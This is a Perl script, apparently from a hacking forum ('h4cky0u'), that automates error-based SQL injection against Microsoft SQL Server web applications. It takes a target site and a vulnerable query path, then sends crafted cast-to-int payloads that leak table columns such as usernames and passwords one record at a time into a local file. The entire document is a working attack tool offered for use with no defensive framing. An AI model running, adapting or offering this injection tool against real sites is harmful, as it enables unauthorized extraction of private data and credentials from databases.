#!/usr/bin/perl
use LWP::UserAgent;

print "\n                  -----------------------------                  ";
print "\n                        MSSQL Dumper v0.1.1                      ";
print "\n                            ALPHA                                ";
print "\n                    By Illuminatus for h4cky0u                   ";
print "\n                  -----------------------------                  ";
print "\n";

my $ua = LWP::UserAgent->new;
$colcount = 0;


sub args{
    print "Hostname (e.g www.site.com):";$host = <STDIN>;chomp $host;
    print "Path (e.g /products.asp?catid=):";$path = <STDIN>;chomp $path;
    print "Database:";$db = <STDIN>;chomp $db;
    print "Database table:";$table = <STDIN>;chomp $table;
   
    print "How many columns would you like to dump:";$colnum = <STDIN>;chomp $colnum;

    print "Column names (format: User,Password):";$colnames = <STDIN>;chomp $colnames;@cols = split(/,/, $colnames);
    print "Records to dump (format: 1-23):";$rec = <STDIN>;chomp $rec;@recs = split (/-/, $rec);
    $count = @recs[0];
}



sub getrecord{
    while($colcount < $colnum){
   
       my $url = "http://".$host.$path."1+AND+(select+cast(CHAR(+127+)%2b+rtrim(cast((select+ISNULL(cast(".@cols[$colcount]."+as+varchar)%2c'null')+from+(select+top+1+*++from+(select+TOP+".$count."+*+from+".$db."..customers+order+by+1+desc+)+dtable+order+by+1+asc)+finaltable)+as+varchar))%2b+CHAR(+127+)+as+int))+%3d+1++Or+3%3d6";
       my $response = $ua->get($url);
       my $content = $response->content;
       if($content =~ m/value(.*)to/) {
             open (RECORDS, '>>output.txt');
             print RECORDS $1;
             close (RECORDS);
       }
       $colcount++;
    }
    open (RECORDS, '>>output.txt');
    print RECORDS "$count\n";
    close (RECORDS);
}

args();

while ($count < @recs[1]){
    getrecord();
    $count++;
    $colcount = 0;
    }
print "Records saved to output.txt"; 